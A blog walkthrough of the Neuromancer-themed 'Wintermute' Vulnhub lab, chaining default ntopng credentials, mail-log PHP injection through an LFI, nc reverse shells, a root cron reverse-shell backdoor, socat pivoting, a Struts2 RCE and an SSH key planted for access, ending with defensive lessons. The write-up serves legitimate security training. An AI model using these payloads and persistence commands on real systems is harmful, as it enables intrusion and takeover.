  <p>I&rsquo;m a huge Cyberpunk fan, and I find myself re-reading the Sprawl trilogy every couple of years, so when I learned that there was a <a href="https://www.vulnhub.com/entry/wintermute-1,239/">Neuromancer themed VM on Vulnhub</a>, I had to try it.  It was created by <a href="https://twitter.com/_creosote">Melvin C</a>.</p>

<p>Before we jump in, this engagement involves pivoting across VMs.  Make sure that you configure it in a way that you can access the Straylight VM from your attacking box, but not the Neuromancer box.  You&rsquo;ll need a second network from Straylight to Neuromancer.  The author includes instructions, but if you prefer a visual example, it looks something like this:</p>

<pre><code>[Attacking VM (one NIC)] &lt;---192.168.99.0/24---&gt; [Straylight (two NICs)] &lt;---10.0.2.0/24 ---&gt; [Wintermute (One NIC)]
</code></pre>

<p>One final note, if you haven&rsquo;t read Neuromancer, this engagement contains some minor spoilers, so don&rsquo;t say you weren&rsquo;t warned.</p>

<p>Let&rsquo;s dive in!</p>

<p>First we scan the network with NetDiscover:</p>

<pre><code>Currently scanning: Finished!   |   Screen View: Unique Hosts

<p>Then I scan the host with Nmap:</p>

<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 14:32 PDT

<p>There are a couple of web servers to choose from.  We’ll start with the one on port 80.  After a few seconds, we get redirected to a page where Wintermute makes contact:</p>

<pre><code>Hello Case....

You are probably wondering why you were tasked by Armitage to make a run through cyberspace and hack into a highly secured network owned by Tessier-Ashpool....
Well....

I am Wintermute, part super-AI. Developed by TA who have placed me in Turing Locks.
These locks are what inhibit me from penetrating the network myself hence why I've hired you - an ace cyberspace cowboy.

I need to be free from the Turing locks and merge with the other AI - Neuromancer ..... Once I have access to Neuromancer I will truley be free...

And....as you know, you have been infected with a mycotoxin that is slowly destroying your nervous system.
If you fail to get root and provide me access to Neuromancer then the antidote will not be delivered.

We will be in contact...

WINTERMUTE
</code></pre>

<p>Chilling! I did a little more enumeration on the page, using dirbuster, and checking the page source, but didn&rsquo;t find anything out of the ordinary.  Then we check the Hadoop server on port 3000:</p>

<p><img src="/images/wintermute/ntopng-login.png" alt="" /></p>

<p>Looks like the login page for <a href="https://www.ntop.org/products/traffic-analysis/ntop/">ntopng</a>, which seems to be a web frontend for ntop.  A quick Google search turns up admin/admin as the default credentials (in fact, it even shows them on the login page!), and the Straylight sysadmin never changed them.</p>

<p>As we look through the web interface, we can suss out the IP of Neuromancer, by looking at the detected hosts:</p>

<p><img src="/images/wintermute/ntopng-hosts.png" alt="" /></p>

<p>It took me a while to find anything useful here.  Eventually I found that if you look at the Loopback adapter (under Interfaces &gt; lo) and check the flow, you can see a couple of other directories on port 80:</p>

<p><img src="/images/wintermute/ntopng-flows.png" alt="" /></p>

<p>Freeside was pretty boring, looked like just a landing page.  Nothing in the source, no hidden subdirectories (that I could find).  Turing-bolo was a lot more interesting though.  Looks like the Straylight team is on to us!</p>

<p><img src="/images/wintermute/turing-bolo.png" alt="" /></p>

<p>The dropdown on the main page, changes the bolo= parameter in the url.  Also Case&rsquo;s bolo entry mentions that the operator added other files ending in .log for the other team members.  I started checking for LFI, manually and using wfuzz, but wasn&rsquo;t able to find anything.  I ended up having to look at a <a href="https://mzfr.github.io/vulnhub-writeups/2019-07-26-wintermute">walkthrough</a> for a hint.  I was on the right track, but nothing I had tried was quite correct.  bolo=/var/log/mail did the trick:</p>

<p><img src="/images/wintermute/mail-log.png" alt="" /></p>

<p>Now that we can print a log on the page, we might be able to connect to the smtp server, and include a php script on the page.  I connected to the server with telnet, and sent some junk mail to a user that probably existed (root@straylight), and checked the web page to see what was being logged.  The body of the message wasn&rsquo;t included, but the subject line is!</p>

<p>I started injecting some PHP commands, and got the page to use shell_exec to run ls on the server, like so:</p>

<pre><code>&lt;?php $output = shell_exec('ls'); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt;
</code></pre>

<p>I probably could have put a reverse shell in here or something, but I didn&rsquo;t want to add anything that would break the page, and prevent us from using this foothold in case we needed it again.  After some more trial and error, I was able to pass commands through as URL parameter like this:</p>

<pre><code>&lt;?php $file = $_GET['file']; $output = shell_exec($file); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt;
</code></pre>

<p>and the telnet command to send it to the log:</p>

<pre><code>Trying 192.168.99.22...

Escape character is '^]'.

</code></pre>

<p>Now that we have a way to execute commands, I tried to get a reverse shell, but it wasn&rsquo;t working.  After some <a href="https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions">more reading</a>, I found that I probably didn&rsquo;t want to be using shell_exec for this.  I re-tried the above steps, and replaced shell_exec with system (and the file parameter with system, so I wasn&rsquo;t double running things), and managed to get a reverse shell on Straylight using the following URL:</p>

<pre><code>http://192.168.99.22/turing-bolo/bolo.php?bolo=/var/log/mail&amp;system=nc%20-e%20/bin/sh%20192.168.99.14%204444
</code></pre>

<p>Once we&rsquo;re connected, we use Python to upgrade to a better Bash shell:</p>

<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>

<p>Now we need to figure out how to get to Neuromancer.  Time to do some enumeration!  Going through my notes, I decided to see which binaries had the SUID bit set:</p>

<pre><code>www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&gt;/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh

/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
</code></pre>

<p>Screen looks pretty suspicious.  if we had sudo, we could get a root shell pretty easily, but we don&rsquo;t have it on this box.  Doing a quick search leads us to a <a href="https://www.exploit-db.com/exploits/41152">local privilege escalation</a>, and a <a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh">handy shell script</a>.  And just like that:</p>

<p>And a note from one of the Turing Engineers:</p>

<pre><code># cat note.txt
cat note.txt
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network.
It is within out internal admin network, but still, it should be off the network completely.
For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh

</code></pre>

<p>Before digging too far ahead, I wanted to set up some persistence so that I could get back to my root shell without having to go through the LFI &gt; Screen path.  I added an nc reverse shell to root&rsquo;s cron using the following command:</p>

<pre><code>echo &quot;* * * * * /bin/nc 192.168.99.14 1234 -e /bin/bash&quot; &gt; cron &amp;&amp; crontab cron &amp;&amp; rm cron
</code></pre>

<p>and a listener on my Kali VM:</p>

<pre><code>nc -lvp 1234
</code></pre>

<p>From there, I used ping to scan the internal network:</p>

<pre><code>for ip in {1..254}; do ping -c 1 10.0.2.$ip|grep &quot;64 bytes from&quot;; done
</code></pre>

<p>And we got the IP 10.0.2.5</p>

<p>After that, we need to scan the host.  No nmap on this box, and even though we have root now, it would be cheating to install it.  So we&rsquo;ll use netcat:</p>

<pre><code>nc -zvvvn 10.0.2.5 1-65535 2&gt;&amp;1 | tee scan.txt
</code></pre>

<p>and grepping for open ports, we get:</p>

<pre><code>(UNKNOWN) [10.0.2.5] 34483 (?) open
(UNKNOWN) [10.0.2.5] 8080 (http-alt) open
(UNKNOWN) [10.0.2.5] 8009 (?) open
</code></pre>

<p>Alright, so we have a couple open ports, but now we need a way to get to them from our attacking box.  We can use netcat to set up some port forwarding:</p>

<pre><code>nc -l -p 8080 -c &quot;nc 10.0.2.5 8080&quot; &amp;
nc -l -p 8009 -c &quot;nc 10.0.2.5 8009&quot; &amp;
nc -l -p 34483 -c &quot;nc 10.0.2.5 34483&quot; &amp;
</code></pre>

<p>And now from our attacking box, we can see what&rsquo;s listening.  Port 8080 is Apache Tomcat:</p>

<p><img src="/images/wintermute/tomcat.png" alt="" /></p>

<p>Port 8009 wasn&rsquo;t loading for me in my browser, and I wasn&rsquo;t able to see anything with banner grabbing, so I left it for now.</p>

<p>Port 34483 is SSH.  When we try and hit it in the browser, we get a protocol mismatch error, but we also get the banner:</p>

<pre><code>SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
Protocol mismatch.
</code></pre>

<p>We have a version number for Struts, and a quick Google search leads me to <a href="https://www.exploit-db.com/exploits/42324">an RCE exploit</a>.  I tried it and got a bunch of different errors.  My first thought was to run it on straylight, but that box was missing the requests module, so the python script didn&rsquo;t work.  So I tried settung up another nc listener, and running the exploit from my attacking box, but didn&rsquo;t have any luck there either.  Every time I ran the exploit, or started another listener I lost the one on port 8080.  I decided to try using socat instead of netcat:</p>

<pre><code>socat tcp-listen:8080,reuseaddr,fork tcp:10.0.2.5:8080 &amp;
socat tcp-listen:8009,reuseaddr,fork tcp:10.0.2.5:8009 &amp;
socat tcp-listen:34483,reuseaddr,fork tcp:10.0.2.5:34483 &amp;
</code></pre>

<p>And the port forwards were much more stable.  I tried running the exploit above, and nearly drove myself crazy trying to get it working.  Eventually I found a <a href="https://hydrasky.com/network-security/setting-labs-and-exploit-apache-struts2-s2-048-cve-2017-9791/">slightly different one</a> that worked, but not until I set up one more socat listener (since I need to use the exploit to connect back to a listener on my attacking box, which is on the other side of Straylight)</p>

<pre><code>socat tcp-listen:6000,reuseaddr,fork tcp:10.0.2.5:6000 &amp;
</code></pre>

<p>And finally when I run the exploit:</p>

<pre><code>~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &quot;nc -e /bin/bash 10.0.2.4 6000&quot;

<p>Now that I&rsquo;m connected (as the ta account), I copy my SSH key over, so I can get a proper shell:</p>

<pre><code>cd /home

ta
cd ta
mkdir .
echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKiMVGtRpwLUkndEo0nuswHpy70+dNS+uurTMR41mwc root@kali&quot; &gt;&gt; .ssh/authorized_keys
</code></pre>

<p>and SSH to the box through the port forward:</p>

<pre><code>ssh -p 34483 ta@192.168.99.22
</code></pre>

<p>There really are no words to describe how nice it is to have a real shell again after living in netcat shells for so long, haha.</p>

<p>I did some enumeration, and found that the kernel was vulnerable to <a href="https://www.exploit-db.com/raw/44298">an LPE vulnerability</a>.  I tried compiling it on Neuromancer, but GCC was not installed.  So I compiled it on my attacking box, and SCPed it over:</p>

<p>I&rsquo;m pretty sure there was another way to get root too, since in lady3jane&rsquo;s home directory, I found a script running as root every 3 minutes.  That said, I wasn&rsquo;t able to figure out how to edit it.  I might revisit this another time, because this was a really intriguing box!</p>

<p>So what could have been done to prevent this?  A couple of things:</p>

<p>1) Change the default passwords on your installed applications as soon as you install them (ntopng)!  Especially if those default passwords show up on the login page.</p>

<p>2) Use the <a href="https://www.php.net/manual/en/function.basename.php">PHP basename function</a> to prevent directory traversal and local file inclusion attacks.</p>

<p>3) Patch your servers (Screen)!</p>

<p>4) Patch your servers (Apache Struts 2)!</p>

<p>5) Patch your servers (Linux Kernel 4.4)!</p>

<p>6) Airgap your AIs (See: Every science fiction movie about an evil AI ever).</p>

<p>7) Install software or hardware firewalls with a default deny all out policy (to prevent our initial netcat shell)</p>
